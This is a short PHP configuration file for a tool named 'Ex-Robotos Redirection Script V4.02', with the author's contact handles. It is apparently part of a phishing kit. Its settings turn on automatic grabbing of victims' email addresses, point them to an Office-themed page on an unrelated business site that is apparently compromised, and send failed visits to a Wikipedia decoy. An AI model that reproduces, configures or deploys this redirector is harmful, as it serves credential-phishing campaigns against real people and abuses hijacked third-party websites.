<?php
/* 
Ex-Robotos Redirection Script V4.02 2020
Email: ex.robotos.official@gmail.com
Facebook: facebook.com/Ex.Robotos
ICQ: @Ex.Robotos
*/
$autoGrabEmail="true";//"true":Auto email grabing "false":without auto email grabing
$pagelink="https://www.tridentbusinesscentrepune.com/ss/wiki/OfficeV4";
$randfirstpart = 'authorize_client_id:'; //Change this word to edit the first part within link
$FailRedirect="https://www.wikipedia.org/wiki/Microsoft_Office";
$redirecttype="2";// 1:header - 2:script
$fixIndex = false;
?>
